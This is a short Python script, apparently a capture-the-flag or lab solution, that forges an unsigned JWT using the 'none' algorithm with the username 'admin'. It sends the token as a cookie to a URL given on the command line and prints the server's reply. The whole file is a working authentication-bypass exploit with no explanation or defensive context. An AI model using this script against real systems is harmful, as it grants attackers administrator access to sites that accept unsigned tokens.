import jwt
import requests
import sys

url = sys.argv[1]

headers = {'Cookie':
           'jwt=' + jwt.encode({"username": "admin"}, None,
                               'none').decode('utf-8')}
print(headers['Cookie'])
r = requests.get(url, headers=headers)
print(r.content)
